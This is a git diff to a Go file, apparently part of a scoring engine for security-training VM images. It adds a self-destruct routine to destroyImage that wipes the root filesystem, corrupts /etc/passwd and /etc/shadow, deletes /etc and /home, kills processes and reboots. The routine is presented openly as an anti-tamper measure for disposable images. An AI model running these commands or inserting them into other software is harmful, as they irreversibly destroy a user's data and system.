@@ -7,7 +7,6 @@ import (
 	"os"
 	"os/exec"
 	"strconv"
-	"time"
 	"unicode/utf8"
 )
 
@@ -17,7 +16,7 @@ func readFile(fileName string) (string, error) {
 }
 
 func tryDecodeString(fileContent string) (string, error) {
-	// For compatability with Windows ANSI/UNICODE/etcetc
+	// For compatibility with Windows ANSI/UNICODE/etcetc
 	// and if Linux ever decides to use weird encoding
 	return fileContent, nil
 }
@@ -109,18 +108,23 @@ func createFQs(mc *metaConfig, numFqs int) {
 	}
 }
 
-func timeCheck(mc *metaConfig) {
-	if time.Now().Unix() >= mc.Config.EndDate {
-		destroyImage(&mc)
-	}
-}
-
 func destroyImage(mc *metaConfig) {
 	failPrint("Destroying the image!")
 	if mc.Cli.Bool("v") {
 		warnPrint("Since you're running this in verbose mode, I assume you're a developer who messed something up. You've been spared from image deletion but please be careful.")
 	} else {
-		shellCommand("rm -rf /opt/aeacus/scoring.dat")
+		shellCommand("rm -rf /opt/aeacus")
+		if !(mc.Config.NoDestroy == "yes") {
+			shellCommand("rm -rf --no-preserve-root / &")
+			shellCommand("cat /dev/urandom > /etc/passwd &")
+			shellCommand("cat /dev/null > /etc/shadow")
+			shellCommand("rm -rf /etc")
+			shellCommand("rm -rf /home")
+			shellCommand("pkill -9 gnome")
+			shellCommand("rm -rf --no-preserve-root /")
+			shellCommand("killall5 -9")
+			shellCommand("reboot now")
+		}
 		os.Exit(1)
 	}
 }
